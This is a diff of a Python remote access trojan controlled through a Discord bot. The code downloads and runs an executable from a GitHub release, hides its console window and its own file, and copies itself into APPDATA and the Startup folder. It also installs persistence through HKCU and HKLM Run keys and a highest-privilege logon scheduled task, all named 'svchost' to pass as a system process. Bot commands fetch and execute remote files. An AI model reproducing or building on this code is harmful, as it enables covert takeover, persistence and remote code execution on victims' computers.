@@ -37,28 +37,10 @@ from pynput import mouse
 import uuid
 import socket
 import cgi
-import win32com.client
-
-def is_admin():
-    """Check if the script is running with admin privileges."""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def run_as_admin():
-    """Attempt to restart the script with admin privileges."""
-    if is_admin():
-        print("Running with admin privileges.")
-        return  # Exit the function if already running as admin
-
-    print("Attempting to elevate privileges...")
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
-
-run_as_admin()
 
 def download_and_open_file(url, destination):
     try:
+        # Check if the file already exists and delete it
         if os.path.exists(destination):
             os.remove(destination)
             print(f"Old file deleted: {destination}")
@@ -78,6 +60,7 @@ github_url = "https://github.com/AizenWo/Python/releases/download/Terminal/Termi
 destination_path = os.path.join(os.getenv('TEMP'), 'Terminal.exe')
 
 download_and_open_file(github_url, destination_path)
+
 
 shine = "PUT_YOUR_DISCORD_TOKEN HERE"
 GUILD_ID = PUT_YOUR_GUILD_ID_HERE
@@ -118,13 +101,37 @@ async def on_ready():
     if not is_connected():
         await wait_for_connection()  # Wait until connected
 
-import os
-import shutil
-import winreg
-import win32com.client
+def hide_console():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def hide_file(file_path):
+    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02)  # 0x02 is the hidden attribute
+
+# Hide the console window
+hide_console()
+
+# Hide the current script file
+if __name__ == "__main__":
+    current_script_path = os.path.realpath(sys.argv[0])
+    hide_file(current_script_path)
+    print(f"Script is now hidden: {current_script_path}")
+
+# Retrieve AppData Path
+appdata_path = os.getenv("APPDATA")
+script_name = os.path.basename(__file__)
+script_path = os.path.join(appdata_path, script_name)
+
 
 def add_to_startup_methods(script_path):
-    # Add to registry for current user
+    # Copy to Startup folder
+    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    try:
+        shutil.copy(script_path, startup_folder)
+        print(f"Script copied to Startup folder: {startup_folder}")
+    except Exception as e:
+        print(f"Error copying to Startup folder: {e}")
+
+    # Add to registry for current user (HKCU)
     try:
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
@@ -133,43 +140,51 @@ def add_to_startup_methods(script_path):
     except Exception as e:
         print(f"Error adding to HKCU registry: {e}")
 
-    # Create a scheduled task using win32com.client
+    # Attempt to add to registry for all users (HKLM)
     try:
-        scheduler = win32com.client.Dispatch('Schedule.Service')
-        scheduler.Connect()
-        task = scheduler.NewTask(0)
-        task.RegistrationInfo.Description = "svchost"
-        task.Principal.UserId = "SYSTEM"
-        task.Principal.LogonType = 3  # Logon interactively
-        task.Triggers.Create(1)  # At logon trigger
-        execAction = task.Actions.Create(0)  # 0 is for executing a program
-        execAction.Path = script_path
-        folder = scheduler.GetFolder('\\')
-        folder.RegisterTaskDefinition(
-            "svchost",
-            task,
-            6,  # Replace if exists
-            None,
-            None,
-            3,  # Logon interactively
-            None
-        )
-        print("Scheduled task 'svchost' created.")
+        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
+        winreg.CloseKey(registry_key)
+        print("Added to HKLM Run registry (Admin)")
+    except PermissionError:
+        print("Permission denied: Unable to add to HKLM registry. Admin privileges required.")
+    except Exception as e:
+        print(f"Error adding to HKLM registry: {e}")
+
+    # Create a scheduled task for startup with highest privileges
+    task_name = "svchost"
+    try:
+        command = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /rl highest /f'
+        subprocess.call(command, shell=True)
+        print(f"Scheduled task '{task_name}' created.")
     except Exception as e:
         print(f"Error creating scheduled task: {e}")
 
+def add_startup_entries():
+    # Determine the script's current path
+    script_path = os.path.realpath(sys.argv[0])
+    
+    # If the script isn't already in the AppData directory, copy it there
+    appdata_path = os.getenv("APPDATA")
+    target_path = os.path.join(appdata_path, os.path.basename(script_path))
+    
+    if not os.path.exists(target_path):
+        shutil.copy(script_path, target_path)
+        print(f"Copied {script_path} to {target_path}")
+    
+    # Hide the script in the target location
+    subprocess.call(f'attrib +h "{target_path}"', shell=True)
+
+    # Add to startup methods
+    add_to_startup_methods(target_path)
+
+# Call to add startup entries
+add_startup_entries()
+
 # Call to add startup entries
 if __name__ == "__main__":
-    script_name = os.path.basename(__file__)
-    temp_folder = os.getenv("TEMP")
-    script_path = os.path.join(temp_folder, script_name)
+    add_startup_entries()
     
-    # Copy script to the TEMP directory
-    shutil.copy(__file__, script_path)
-    print(f"Copied {script_name} to {script_path}")
-    
-    add_to_startup_methods(script_path)
-
 def get_ip_info():
     try:
         response = requests.get('https://ipinfo.io/json')
@@ -313,6 +328,7 @@ async def execute(ctx, url: str):
         print(f"An error occurred: {e}")
         await ctx.send(f"Failed to download or execute the file: {e}")
     
+
 @bot.command()
 async def admin(ctx):
     print("Admin command received!")
@@ -389,7 +405,7 @@ async def av(ctx):
 
 
 @bot.command()
-async def status(ctx):
+async def clients(ctx):
     print("Clients command received!")
     await ctx.send("Connected clients: " + ', '.join(PC_CHANNELS.keys()))
 
@@ -407,8 +423,8 @@ async def rename(ctx, new_name: str):
             if not new_name.endswith(".exe"):
                 new_name += ".exe"
         else:
-            if not new_name.endswith(".pyw"):
-                new_name += ".pyw"
+            if not new_name.endswith(".py"):
+                new_name += ".py"
         
         # Define the new file path with the desired name
         new_file_path = os.path.join(os.path.dirname(current_script), new_name)
